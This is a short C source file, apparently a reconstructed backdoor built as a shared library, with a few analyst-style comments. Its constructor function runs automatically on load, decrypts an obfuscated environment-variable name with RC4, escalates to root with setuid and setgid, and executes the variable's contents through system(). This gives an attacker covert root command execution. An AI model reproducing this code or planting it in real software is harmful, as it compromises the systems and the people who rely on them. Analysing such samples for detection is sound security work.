#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "rc4.h"
#include "key.h"

#define ENCRYPTED_STR "\x1F\x82\xAE\x65\xCA\x7F\xA2\xE2\x91\x07\x6F\xC0"

__attribute__((constructor))
char *init_method(void) {
  char encrypted_str1[13];
  char encrypted_str2[13];
  char *command;

  // "HTTP_SETTHIS" encrypted string
  strcpy(encrypted_str1, ENCRYPTED_STR);
  command = getenv(rc4(key, encrypted_str1, 12));
  if (!command)
    return NULL;

  setgid(0 /* root */);
  setuid(0 /* root */);
  printf("\n");
  // this seems odd, I wonder why it is implemented that way.
  strcpy(encrypted_str2, ENCRYPTED_STR); // redundant
  unsetenv(rc4(key, encrypted_str2, 12));
  system(command);
  exit(0);

  // never reached
  return NULL;
}
